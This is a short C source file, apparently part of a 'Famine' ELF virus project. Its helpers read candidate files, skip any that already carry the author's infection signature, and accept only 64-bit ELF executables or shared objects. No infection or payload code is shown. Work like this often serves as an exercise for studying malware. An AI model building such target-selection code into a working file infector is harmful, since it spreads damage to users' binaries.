#include "famine.h"

ssize_t get_file_size(const char *file_name)
{
	struct stat stat;

	if (!(lstat(file_name, &stat) == 0))
	{
		return ERROR_CODE;
	}

	return stat.st_size;
}

int copy_file(t_woody *woody, char *filename)
{
	int fd = open(filename, O_RDONLY);

	if (fd < 0)
	{
		return ERROR_CODE;
	}

	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
	{
		close(fd);
		return ERROR_CODE;
	}
	char * string = woody->addr;
	for (int i = 0; i < woody->filesize; i++){
		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 52) != NULL){
			close(fd);
			return ERROR_CODE;
		}
	}
	close(fd);
	return 0;
}

int check_fileformat(unsigned char *c, ssize_t filesize)
{
	if (filesize > 16 && 
		c[0] == 0x7f &&
		c[1] == 'E' &&
		c[2] == 'L' &&
		c[3] == 'F' &&
		c[4] == ELFCLASS64 &&
		(c[16] == ET_EXEC || c[16] == ET_DYN))
	{
		return 0;
	}
	else
	{
		free(c);
		return ERROR_CODE;
	}
}

int read_elf_file(t_woody *woody, char *filename)
{
	woody->filesize = get_file_size(filename);
	if(woody->filesize == ERROR_CODE || woody->filesize < 16){
		free(filename);
		return ERROR_CODE;
	}

	woody->filename = filename;
	woody->addr = malloc(woody->filesize);
	if (woody->addr == NULL)
	{
		free(filename);
		return ERROR_CODE;
	}

	if(copy_file(woody, filename) == ERROR_CODE){
		free(filename);
		free(woody->addr);
		return ERROR_CODE;
	}
	free(filename);
	return check_fileformat(woody->addr, woody->filesize);
}
